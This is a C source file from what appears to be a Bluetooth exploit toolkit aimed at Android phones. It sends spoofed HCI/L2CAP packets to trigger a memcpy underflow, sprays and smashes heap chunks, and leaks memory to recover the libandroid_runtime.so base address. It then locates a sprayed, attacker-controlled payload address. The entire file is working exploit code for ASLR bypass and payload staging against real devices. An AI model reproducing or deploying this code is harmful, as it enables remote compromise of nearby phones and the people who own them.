#include "leak.h"

#include "log.h"

#include <stdlib.h>
#include <unistd.h>

#include <time.h>

#include "autogen/libandroid_runtime_constants.h"

// The following #defines represent host (attacker) to victim (phone) conversions (or vice versa)
// They are added for completeness, and to make migration easier in case someone insanely targets a non-existent big-endian phone...
#define htovs(d) (d)
#define htovl(d) (d)
#define htovll(d) (d)
#define vtohs(d) (d)
#define vtohl(d) (d)
#define vtohll(d) (d)

// #define LEAK_SPRAY_TRY_COUNT (4u)
// #define LEAK_SPRAY_COUNT (64u)
#define LEAK_SPRAY_TRY_COUNT (8u)
#define LEAK_SPRAY_COUNT (32u)

// print (size_t)malloc_usable_size(0x7bf602ce31)print (size_t)malloc_usable_size(0x7020943000)
#define LEAK_SPRAY_CHUNK_SIZE ((size_t)512u)
#define LEAK_SPRAY_PACKET_SIZE (LEAK_SPRAY_CHUNK_SIZE - sizeof(struct bluetooth_remote_header))

#define LEAK_EGG ("\xDE\xAD\xBE\xEF\xBA\xDC\x0D\xED")
#define LEAK_EGG_SIZE (sizeof(LEAK_EGG) - 1)

#define LEAK_MEMCPY_UNDERFLOW_SIZE ((size_t)66u)
#define LEAK_MEMCPY_ALIGNED_OVERFLOW_SIZE ((size_t)80)

#define LEAK_ID_CLEANER_CHUNK_SIZE ((size_t)32)
#define LEAK_HEAP_CLEANER_PACKET_COUNT ((size_t)0x180)
// #define LEAK_HEAP_CLEANER_PACKET_COUNT ((size_t)0x40 /* Use this one for quick prototyping - Provides less leaks but faster */)

#define LEAK_FANCY_TARGET_PACKET_IDENTIFIER ((uint8_t)42u)
#define LEAK_FANCY_TARGET_PACKET_SIZE (LEAK_MEMCPY_UNDERFLOW_SIZE - sizeof(struct bluetooth_remote_header) + offsetof(struct bluetooth_remote_header, hci_header))

#define LEAK_AMOUNT ((uint16_t)0x280)

#define LEAK_SPRAY_PACKET_FILLER ('L')
#define LEAK_TARGET_PACKET_FILLER ('T')
#define LEAK_SMASHER_PACKET_FILLER ('S')
#define LEAK_CLEANER_PACKET_FILLER ('C')

#define LEAK_CONTROLLED_PAYLOAD_TRY_COUNT ((size_t)1024u)
#define LEAK_CONTROLLED_PAYLOAD_SPRAY_COUNT ((size_t)256u)

static err_t leak_simple_sized(const int hci_sock_fd, const uint16_t hci_handle, const int l2cap_sock_fd, uint8_t *const packet_id, struct bluetooth_l2cap_header **packet, size_t first_packet_size, size_t second_packet_size);

err_t leak_simple(const int hci_sock_fd, const uint16_t hci_handle, const int l2cap_sock_fd, uint8_t *const packet_id, struct bluetooth_l2cap_header **packet)
{
    LOGL_INFO("Attempting simple leak...\n")
    ERR_FWD(leak_simple_sized(hci_sock_fd, hci_handle, l2cap_sock_fd, packet_id, packet, LEAK_MEMCPY_UNDERFLOW_SIZE, LEAK_MEMCPY_UNDERFLOW_SIZE));

    return NULL;
}

err_t leak_fancy(const int hci_sock_fd, const uint16_t hci_handle, const int l2cap_sock_fd, uint8_t *const packet_id, bool (*const leak_callback)(uint8_t *data, size_t data_size, void *private), void *private)
{
    LOGL_INFO("Attempting fancy leak...\n")

    ////////////
    // Step 1 //
    ////////////
    LOGL_INFO("Step1: Using simple leak to leak remote handle\n")
    struct bluetooth_l2cap_header *packet = NULL;
    ERR_FWD(leak_simple(hci_sock_fd, hci_handle, l2cap_sock_fd, packet_id, &packet));
    LOGL_DBG_INFO("Simple-Leak packet data:\n")
    logl_hex(packet->data, packet->len);

    struct bluetooth_header *leaked_header = (struct bluetooth_header *)(packet->data + packet->len - 2 - offsetof(struct bluetooth_header, acl_header));
    uint16_t leaked_handle = BLUETOOTH_HCI_HANDLE_VALUE_MASK & vtohll(leaked_header->hci_header.handle);
    // LOGL_DBG_VAR(leaked_handle, "%" PRIu16)

    free(packet);
    packet = NULL;

    LOGL_SUCCESS("Leaked remote handle = %" PRIu16 "\n", leaked_handle)

    ////////////
    // Step 2 //
    ////////////
    LOGL_INFO("Step 2: Creating the fake packet...\n")
    uint8_t spray_packet_data[LEAK_SPRAY_PACKET_SIZE];
    memset(spray_packet_data, LEAK_SPRAY_PACKET_FILLER, sizeof(spray_packet_data));

    struct bluetooth_remote_header *fake_header = (struct bluetooth_remote_header *)(spray_packet_data                                                                   // We are now at the start of the packet
                                                                                     + LEAK_SPRAY_PACKET_SIZE                                                            // We are now at the end of the packet
                                                                                     - LEAK_MEMCPY_UNDERFLOW_SIZE + offsetof(struct bluetooth_remote_header, acl_header) // We are now at the location where the leak will start
                                                                                     - offsetof(struct bluetooth_remote_header, hci_header));                            // We are shifting the header to make the leak start at the beginning of the hci header
    memcpy(spray_packet_data + LEAK_SPRAY_PACKET_SIZE - LEAK_EGG_SIZE, LEAK_EGG, LEAK_EGG_SIZE);

    // struct bluetooth_header fake_header;
    ERR_FWD(bluetooth_remote_header_spoof(leaked_handle, LEAK_FANCY_TARGET_PACKET_IDENTIFIER, 0, false, LEAK_AMOUNT, fake_header));

    LOGL_DBG_INFO("Fake packet data:\n")
    logl_hex(spray_packet_data, LEAK_SPRAY_PACKET_SIZE);

    LOGL_SUCCESS("Created fake packet\n")

    ////////////
    // Step 3 //
    ////////////
    LOGL_INFO("Step 3: Spraying fake packet data on target heap...\n")

    bool leak_egg_found = false;
    for (size_t i = 0; i < LEAK_SPRAY_TRY_COUNT && !leak_egg_found; i++)
    {
        for (size_t j = 0; j < LEAK_SPRAY_COUNT; j++)
        {
            uint8_t chosen_packet_id = *packet_id;
            // LOGL_DBG_VAR(chosen_packet_id, "%" PRIu8);

            LOGL_CLEAR()
            LOGL_INFO("Spraying fake packet %zu/%u...", j, LEAK_SPRAY_COUNT)
            ERR_FWD(bluetooth_hci_packet_spoof_send(hci_sock_fd, hci_handle, chosen_packet_id, 0, false, spray_packet_data, LEAK_SPRAY_PACKET_SIZE))
            ERR_FWD(bluetooth_inc_packet_id(packet_id))

            ERR_FWD(bluetooth_l2cap_recv_packet_id(l2cap_sock_fd, &packet, chosen_packet_id));

            free(packet);
            packet = NULL;
        }

        LOGL_CLEAR()
        LOGL_INFO("Testing if fake packet was sprayed correctly...\n")

        ERR_FWD(leak_simple_sized(hci_sock_fd, hci_handle, l2cap_sock_fd, packet_id, &packet, LEAK_MEMCPY_UNDERFLOW_SIZE, LEAK_SPRAY_PACKET_SIZE));
        LOGL_DBG_INFO("Simple-Leak packet data:\n")
        logl_hex(packet->data, packet->len);

        // Check if a matching leak egg is found
        const size_t leak_egg_offset = packet->len                                            // We are now at the end of the packet
                                       - 2                                                    // We are now at the start of the leaked acl_header
                                       - offsetof(struct bluetooth_remote_header, acl_header) // We are now at the start of the leaked BT_HDR
                                       - LEAK_EGG_SIZE;                                       // We are now at the start of the leaked LEAK_EGG
        if (memcmp(packet->data + leak_egg_offset, LEAK_EGG, LEAK_EGG_SIZE) == 0)
            leak_egg_found = true;

        free(packet);
        packet = NULL;

        if (!leak_egg_found)
            LOGL_WARNING("Could not find leak egg in packet data\n")
    }

    if (leak_egg_found)
        LOGL_SUCCESS("Spray was successful\n")
    else
        ERR_RET("SPRAY_FAILED", "Could not find leak egg in any of the packets")

    ////////////
    // Step 4 //
    ////////////
    LOGL_INFO("Step 4: Sending heap cleaner packets...\n")
    uint8_t heap_cleaner_packet_buffer[LEAK_FANCY_TARGET_PACKET_SIZE];
    memset(heap_cleaner_packet_buffer, LEAK_CLEANER_PACKET_FILLER, LEAK_FANCY_TARGET_PACKET_SIZE);
    for (size_t i = 0; i < LEAK_HEAP_CLEANER_PACKET_COUNT; i++)
    {
        LOGL_CLEAR()
        LOGL_INFO("Sending heap cleaner packet %zu/%zu...", i, LEAK_HEAP_CLEANER_PACKET_COUNT)
        ERR_FWD(bluetooth_hci_packet_spoof_send(hci_sock_fd, hci_handle, *packet_id, 0, false, heap_cleaner_packet_buffer, sizeof(heap_cleaner_packet_buffer)))
        ERR_FWD(bluetooth_l2cap_recv_packet_id(l2cap_sock_fd, &packet, *packet_id));

        ERR_FWD(bluetooth_inc_packet_id(packet_id))

        free(packet);
        packet = NULL;
    }
    LOGL_CLEAR()
    LOGL_INFO("Sent %zu heap cleaner packets\n", LEAK_HEAP_CLEANER_PACKET_COUNT)

    ////////////
    // Step 5 //
    ////////////
    LOGL_INFO("Step 5: Attempting smash of packet header...\n")

    uint8_t target_packet_buffer[LEAK_FANCY_TARGET_PACKET_SIZE];
    memset(target_packet_buffer, LEAK_TARGET_PACKET_FILLER, LEAK_FANCY_TARGET_PACKET_SIZE);
    uint8_t smasher_packet_buffer[LEAK_SPRAY_PACKET_SIZE];
    memset(smasher_packet_buffer, LEAK_SMASHER_PACKET_FILLER, LEAK_SPRAY_PACKET_SIZE);
    uint8_t indentifier_cleaner_packet_buffer[LEAK_ID_CLEANER_CHUNK_SIZE];
    memset(indentifier_cleaner_packet_buffer, LEAK_CLEANER_PACKET_FILLER, LEAK_ID_CLEANER_CHUNK_SIZE);

    for (size_t i = 0; /* i < 50 */; i++)
    {
        // This (commented) is the normal and expected method to iterate over the ids and reach the correct ID (the one we sprayed)
        // This method is slow and takes a lot of time to reach the correct ID
        // while (*packet_id != LEAK_FANCY_TARGET_PACKET_IDENTIFIER)
        // {
        //     LOGL_CLEAR()
        //     LOGL_DBG_INFO("Sending packet identifier cleaner packet with id %" PRIu8 "...", *packet_id)
        //     ERR_FWD(bluetooth_hci_packet_spoof_send(hci_sock_fd, hci_handle, *packet_id, 0, false, indentifier_cleaner_packet_buffer, LEAK_ID_CLEANER_CHUNK_SIZE))
        //     ERR_FWD(bluetooth_l2cap_recv_packet_id(l2cap_sock_fd, &packet, *packet_id));

        //     free(packet);
        //     packet = NULL;

        //     if (LEAK_FANCY_TARGET_PACKET_IDENTIFIER - *packet_id > 10)
        //     {
        //         ERR_FWD(bluetooth_inc_packet_id(packet_id))
        //         ERR_FWD(bluetooth_inc_packet_id(packet_id))
        //         ERR_FWD(bluetooth_inc_packet_id(packet_id))
        //         ERR_FWD(bluetooth_inc_packet_id(packet_id))
        //         ERR_FWD(bluetooth_inc_packet_id(packet_id))
        //     }
        //     ERR_FWD(bluetooth_inc_packet_id(packet_id))
        // }

        // This is a more aggressive method to iterate over the ids and reach the correct ID (the one we sprayed)
        // It does so by only sending one packet that is on the other side of the spectrum of IDs, this allows us to only send 1 packet and be able to use the correct ID afterwards
        *packet_id = 0xff - LEAK_FANCY_TARGET_PACKET_IDENTIFIER;
        ERR_FWD(bluetooth_hci_packet_spoof_send(hci_sock_fd, hci_handle, *packet_id, 0, false, indentifier_cleaner_packet_buffer, LEAK_ID_CLEANER_CHUNK_SIZE))
        ERR_FWD(bluetooth_l2cap_recv_packet_id(l2cap_sock_fd, &packet, *packet_id));

        free(packet);
        packet = NULL;

        *packet_id = LEAK_FANCY_TARGET_PACKET_IDENTIFIER;

        LOGL_INFO("Attempting data leak %zu...\n", i)
        uint8_t chosen_packet_id = *packet_id;
        // LOGL_DBG_VAR(chosen_packet_id, "%" PRIu8);

        // getc(stdin);
        // Send the two packets
        ERR_FWD(bluetooth_hci_packet_spoof_send(hci_sock_fd, hci_handle, chosen_packet_id, 2, false, target_packet_buffer, sizeof(target_packet_buffer)))
        ERR_FWD(bluetooth_inc_packet_id(packet_id))

        ERR_FWD(bluetooth_hci_packet_spoof_send(hci_sock_fd, hci_handle, *packet_id, 0, true, smasher_packet_buffer, sizeof(smasher_packet_buffer)))
        ERR_FWD(bluetooth_inc_packet_id(packet_id))

        // Receive the leak packet (hopefully)
        ERR_FWD(bluetooth_l2cap_recv_packet_id(l2cap_sock_fd, &packet, chosen_packet_id));

        LOGL_SUCCESS("Successfully leaked heap data\n")

        LOGL_INFO("Sending data to callback...\n")
        const size_t leak_offset = 0                                                                                  // We are now at the start of the packet data
                                   - sizeof(struct bluetooth_remote_header)                                           // We are now at the start of the remote header
                                   + offsetof(struct bluetooth_remote_header, hci_header)                             // We are now at the start of the memcpy underflow
                                   + LEAK_MEMCPY_UNDERFLOW_SIZE                                                       // We are now at the start of the memcpy destination
                                   - ((sizeof(struct bluetooth_remote_header) + LEAK_FANCY_TARGET_PACKET_SIZE) & 0xF) // We are now at the start of the first address that is aligned to 0x10
                                   + LEAK_MEMCPY_ALIGNED_OVERFLOW_SIZE;                                               // We are now at the start of the leaked data (that is not a part of the smasher buffer)

        // logl_hex(packet->data + leak_start, packet->len);
        bool continue_leaking = leak_callback(packet->data + leak_offset, packet->len, private);

        free(packet);
        packet = NULL;

        if (!continue_leaking)
        {
            LOGL_INFO("Leak callback returned false, stopping leak\n")
            break;
        }
    }

    return NULL;
}

static inline bool is_userspace_pointer(const uint64_t pointer)
{
    const uint64_t userspace_max = 0x00007fffffffffff;
    const uint64_t userspace_min = 0x00000000ffffffff;

    return vtohll(pointer) <= userspace_max && vtohll(pointer) >= userspace_min;
}

static void leak_print_chars(uint8_t *data, size_t data_size)
{
    for (size_t j = 0; j < data_size; j++)
    {
        char c = data[j];
        if (c < 0x20 || c > 0x7E)
            LOG_DBG_INFO("%c", '.')
        else
            LOG_INFO("%c", c)
    }
}

static bool leak_callback(uint8_t *data, size_t data_size, void *private)
{
    const size_t pointers_per_line = 4;

    uint64_t *data64 = (uint64_t *)data;
    size_t data64_size = data_size / sizeof(*data64);
    size_t i;

    ssize_t pattern_valid_index = -1;
    uint64_t pattern_first_pointer = 0;
    for (i = 0; i < data64_size; i++)
    {
        if (i % pointers_per_line == 0)
        {
            if (i != 0)
            {
                leak_print_chars((uint8_t *)(data64 + i - 4), sizeof(*data64) * pointers_per_line);
                LOG_DBG_INFO("\n");
            }

            LOGL_DBG_INFO("")
        }

        if (i <= data64_size - 4)
        {
            bool pattern_valid = true;
            pattern_valid &= is_userspace_pointer(data64[i]);
            pattern_valid &= is_userspace_pointer(data64[i + 1]);
            pattern_valid &= is_userspace_pointer(data64[i + 2]);
            pattern_valid &= is_userspace_pointer(data64[i + 3]);

            pattern_valid &= LIBANDROID_RUNTIME_SECOND_ASLR_LEAK_OFFSET - LIBANDROID_RUNTIME_FIRST_ASLR_LEAK_OFFSET == vtohll(data64[i + 2]) - vtohll(data64[i]);

            if (pattern_valid)
            {
                pattern_valid_index = i;
                pattern_first_pointer = vtohll(data64[i]) - LIBANDROID_RUNTIME_FIRST_ASLR_LEAK_OFFSET;
            }
        }

        if (pattern_valid_index != -1 && i - pattern_valid_index < 4)
            LOG_SUCCESS("0x%016" PRIx64, vtohll(data64[i]))
        else if (is_userspace_pointer(data64[i]))
            LOG_INFO("0x%016" PRIx64, vtohll(data64[i]))
        else
            LOG_DBG_INFO("0x%016" PRIx64, vtohll(data64[i]))

        LOG_DBG_INFO(" ")
    }

    while (i % pointers_per_line != 0)
    {
        LOG_DBG_INFO("  " /*0x*/ "                " /*PRIx64*/ " ")
        i++;
    }

    leak_print_chars((uint8_t *)(data64 + i - pointers_per_line), sizeof(*data64) * pointers_per_line);
    LOG_DBG_INFO("\n");

    *(uint64_t *)private = pattern_first_pointer;

    if (pattern_valid_index != -1)
        LOGL_SUCCESS("Found target pattern at index %" PRIu64 "\n", pattern_valid_index)

    return pattern_valid_index == -1;
}

err_t leak_libandroid_runtime_base(const bdaddr_t bdaddr, uint8_t *const packet_id, uint64_t *const libandroid_runtime_base)
{
    LOGL_INFO("Attempting to leak libandroid_runtime.so base...\n")

    int hci_sock_fd, l2cap_sock_fd;
    uint16_t hci_handle;

    ERR_FWD(bluetooth_connect(bdaddr, false, true, &hci_sock_fd, &l2cap_sock_fd, &hci_handle));

    uint64_t leaked_value = 0;
    ERR_FWD_CLEANUP(leak_fancy(hci_sock_fd, hci_handle, l2cap_sock_fd, packet_id, leak_callback, &leaked_value),
                    bluetooth_disconnect(hci_sock_fd, l2cap_sock_fd, hci_handle););

    ERR_FWD(bluetooth_disconnect(hci_sock_fd, l2cap_sock_fd, hci_handle));

    if (!leaked_value)
        ERR_RET("LEAK_LIBANDROID_RUNTIME_BASE", "Could not leak libandroid runtime base address");

    *libandroid_runtime_base = leaked_value;
    return NULL;
}

// err_t leak_packet_address(const int hci_sock_fd, const uint16_t hci_handle, const int l2cap_sock_fd, uint8_t *const packet_id, uint64_t *const packet_address)
// err_t leak_packet_address(const bdaddr_t bdaddr, uint8_t *const packet_id, uint64_t *const packet_address)
err_t leak_controlled_payload_address(const bdaddr_t bdaddr, size_t target_chunk_size, uint8_t *const packet_id, void (*const payload_generator_callback)(uint64_t payload_address, uint8_t *payload_data, size_t payload_data_size, void *private), void *private)
{
    LOGL_INFO("Attempting leak of packet base...\n")
    int hci_sock_fd, l2cap_sock_fd;
    uint16_t hci_handle;
    ERR_FWD(bluetooth_connect(bdaddr, false, true, &hci_sock_fd, &l2cap_sock_fd, &hci_handle));

    uint64_t packet_address = 0;
    size_t destination_packet_size = target_chunk_size - sizeof(struct bluetooth_remote_header) - 2;

    for (size_t i = 0; i < LEAK_CONTROLLED_PAYLOAD_TRY_COUNT; i++)
    {
        // destination_packet_size = (destination_packet_size & ~0xF) + LEAK_MEMCPY_ALIGNED_OVERFLOW_SIZE;

        struct bluetooth_l2cap_header *packet = NULL;
        ERR_FWD_CLEANUP(leak_simple_sized(hci_sock_fd, hci_handle, l2cap_sock_fd, packet_id, &packet, destination_packet_size, 2),
                        bluetooth_disconnect(hci_sock_fd, l2cap_sock_fd, hci_handle););

        // const size_t leak_offset = 0                            // We are now at the start of the destination packet data
        //                            + destination_packet_size    // We are now at the end of the destination packet
        //                            - LEAK_MEMCPY_UNDERFLOW_SIZE // We are now at the start of the memcpy underflow
        //                            - 2;                         // This is to make it 8-byte aligned
        // leak_callback(packet->data + leak_offset, packet->len - leak_offset, packet_address);
        // logl_hex(packet->data + leak_offset, packet->len - leak_offset);

        const struct bluetooth_remote_header *leaked_header = (const struct bluetooth_remote_header *)(packet->data                                           // We are now at the start of the packet data
                                                                                                       + packet->len                                          // We are now at the end of the packet
                                                                                                       - 2                                                    // We are now at the start of the leaked acl_header
                                                                                                       - offsetof(struct bluetooth_remote_header, acl_header) // We are now at the start of the leaked BT_HDR
        );

        uint16_t leaked_handle = vtohll(leaked_header->hci_header.handle);
        // LOGL_DBG_VAR(leaked_handle, "%" PRIu16);

        // This is the pattern I found using the experiment, but I have no idea why we cannot find it
        // struct list_item
        // {
        //     struct re_list_item *prev;
        //     uint64_t id1;
        //     uint64_t id2;
        //     void *packet_address;
        // };
        // struct list_item *leaked_list_item = (struct list_item *)((uint8_t *)leaked_header - sizeof(struct list_item));
        const uint64_t *leaked_pointers = (uint64_t *)leaked_header - 4;

        LOGL_INFO()
        for (size_t j = 0; j < 4; j++)
        {
            uint64_t leaked_pointer = leaked_pointers[j];
            if (is_userspace_pointer(leaked_pointer))
                LOG_SUCCESS("0x%016" PRIx64, leaked_pointer)
            else
                LOG_INFO("0x%016" PRIx64, leaked_pointer)

            LOG_INFO(" ")
        }
        LOG_INFO("\n")

        if (
            // This is the pattern that is used in the Insinuator exploit:
            (leaked_pointers[0] == 0x0000000400021100                                                     // The magic
             && (leaked_pointers[1] & 0xffffffffffff0000) == 0x00010006000a0000                           // The key
             && (leaked_pointers[1] & 0x000000000000ffff) == leaked_handle                                // The handle is at the end of the key
             && (leaked_pointers[2] & 0xffffffff00000000) == 0x0000424200000000                           // The c-something?
             && is_userspace_pointer(leaked_pointers[3]) && (leaked_pointers[3] % target_chunk_size == 0) // The packet pointer is a valid address that is aligned to the target chunk size
             ) ||
            // This is the pattern that I found:
            (leaked_pointers[0] == 0                                                                      // First pointer is null
             && (leaked_pointers[2] & 0xffffffffffff0000ull) == 0x00000074ea0e0000ull                     // Some magical pattern
             && (leaked_pointers[2] & 0x000000000000ffffull) == leaked_pointers[1]                        // Last part of third pointer is equal to the first pointer
             && is_userspace_pointer(leaked_pointers[3]) && (leaked_pointers[3] % target_chunk_size == 0) // The packet pointer is a valid address that is aligned to the target chunk size
             ))
        {
            packet_address = leaked_pointers[3];

            free(packet);
            packet = NULL;

            break;
        }

        free(packet);
        packet = NULL;
    }

    if (packet_address == 0)
    {
        bluetooth_disconnect(hci_sock_fd, l2cap_sock_fd, hci_handle);
        ERR_RET("LEAK_PATTERN_NOT_FOUND", "Could not find packet address pattern")
    }

    LOGL_SUCCESS("Leaked packet address = 0x%016" PRIx64 "\n", packet_address)

    LOGL_INFO("Sending packet address to the payload generator callback...\n")
    // size_t i = 0                                                                                // We are now at partial_packet[handle]->data + 3
    //            + sizeof(uint64_t) - 3                                                           // We are now at partial_packet[handle]->data + sizeof(uint64_t)
    //            + sizeof(uint64_t) - (sizeof(struct bluetooth_remote_header) % sizeof(uint64_t)) // We are now at partial_packet[handle] + (some multiple of sizeof(uint64_t))
    //     ;
    size_t payload_offset = 0                                                                                // We are now at the start of the packet data
                            + sizeof(uint64_t) - (sizeof(struct bluetooth_remote_header) % sizeof(uint64_t)) // We are now at partial_packet[handle] + (some multiple of sizeof(uint64_t))
        ;
    size_t payload_size = destination_packet_size - payload_offset;
    uint8_t *payload_data = (uint8_t *)malloc(payload_size);
    memset(payload_data, 0, payload_size);

    payload_generator_callback(packet_address + sizeof(struct bluetooth_remote_header) + payload_offset, payload_data, payload_size, private);

    LOGL_DBG_INFO("Payload data:\n")
    logl_hex(payload_data, payload_size);

    LOGL_INFO("Attempting spray of payload...\n")

    uint8_t spray_packet_data[LEAK_SPRAY_PACKET_SIZE] = {0};
    memcpy(spray_packet_data + payload_offset, payload_data, payload_size);
    free(payload_data);
    payload_data = NULL;

    for (size_t i = 0; i < LEAK_CONTROLLED_PAYLOAD_SPRAY_COUNT; i++)
    {
        uint8_t chosen_packet_id = *packet_id;
        // LOGL_DBG_VAR(chosen_packet_id, "%" PRIu8);

        LOGL_CLEAR()
        LOGL_INFO("Spraying payload %zu/%zu...", i, LEAK_CONTROLLED_PAYLOAD_SPRAY_COUNT)
        ERR_FWD_CLEANUP(bluetooth_hci_packet_spoof_send(hci_sock_fd, hci_handle, chosen_packet_id, 0, false, spray_packet_data, LEAK_SPRAY_PACKET_SIZE),
                        bluetooth_disconnect(hci_sock_fd, l2cap_sock_fd, hci_handle);)
        ERR_FWD_CLEANUP(bluetooth_inc_packet_id(packet_id),
                        bluetooth_disconnect(hci_sock_fd, l2cap_sock_fd, hci_handle);)

        struct bluetooth_l2cap_header *packet = NULL;
        ERR_FWD_CLEANUP(bluetooth_l2cap_recv_packet_id(l2cap_sock_fd, &packet, chosen_packet_id),
                        bluetooth_disconnect(hci_sock_fd, l2cap_sock_fd, hci_handle););

        free(packet);
        packet = NULL;
    }

    LOGL_CLEAR()
    LOGL_SUCCESS("Sprayed %zu payload packets\n", LEAK_CONTROLLED_PAYLOAD_SPRAY_COUNT)

    ERR_FWD(bluetooth_disconnect(hci_sock_fd, l2cap_sock_fd, hci_handle));

    return NULL;
}

static err_t leak_simple_sized(const int hci_sock_fd, const uint16_t hci_handle, const int l2cap_sock_fd, uint8_t *const packet_id, struct bluetooth_l2cap_header **packet, size_t first_packet_size, size_t second_packet_size)
{
    if (packet_id == NULL)
        ERR_RET("NULL_PACKET_ID", "Parameter packet_id cannot be NULL");

    uint8_t *buffer = NULL;
    uint8_t chosen_packet_id = *packet_id;
    // LOGL_DBG_VAR(chosen_packet_id, "%" PRIu8);

    // Send the trigger packets
    buffer = (uint8_t *)malloc(first_packet_size);
    memset(buffer, 'A', first_packet_size);
    ERR_FWD(bluetooth_hci_packet_spoof_send(hci_sock_fd, hci_handle, *packet_id, 2, false, buffer, first_packet_size))
    ERR_FWD(bluetooth_inc_packet_id(packet_id))
    free(buffer);

    buffer = (uint8_t *)malloc(second_packet_size);
    memset(buffer, 'B', second_packet_size);
    ERR_FWD(bluetooth_hci_packet_spoof_send(hci_sock_fd, hci_handle, *packet_id, 0, true, buffer, second_packet_size))
    ERR_FWD(bluetooth_inc_packet_id(packet_id))
    free(buffer);

    // Receive the echo packet
    ERR_FWD(bluetooth_l2cap_recv_packet_id(l2cap_sock_fd, packet, chosen_packet_id));

    // Just a fallback
    return NULL;
}